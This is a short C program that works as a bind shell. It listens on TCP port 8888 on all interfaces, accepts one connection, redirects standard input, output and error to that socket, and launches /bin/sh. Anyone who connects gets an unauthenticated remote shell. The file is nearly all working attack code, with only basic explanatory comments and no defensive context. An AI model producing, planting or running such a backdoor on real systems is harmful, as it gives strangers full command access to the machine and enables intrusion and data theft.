#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>

// error is called when a system call fails.
// displays on stderr.
void error(char *msg)
{
	perror(msg);

	exit(1);
}

int main(int argc, char *argv[])
{
	int listen_sock = socket(AF_INET, SOCK_STREAM, 0);
	if (listen_sock < 0)
		error("ERROR opening socket");

	// A sockaddr_in is a structure containing an internet address.
	// This structure is defined in <netinet/in.h>.

	struct sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;           // address family
	server_addr.sin_addr.s_addr = INADDR_ANY;   // IP address of the host
	server_addr.sin_port = htons(8888);         // port number

	// Binds a socket to an address
	int bind_verif = bind(listen_sock, (struct sockaddr*)&server_addr, 
			sizeof(server_addr));
	if (bind_verif < 0)
		error("ERROR on binding");
	
	// Allows the process to listen on the socket for connections
	listen(listen_sock, 0);

	int conn_sock = accept(listen_sock, NULL, NULL);
	if (conn_sock < 0)
		error("ERROR on accept");

	 
	for (int i=0; i<3; ++i) {
		dup2(conn_sock, i);
	}

	execve("/bin/sh", NULL,NULL);

	return 0;
}
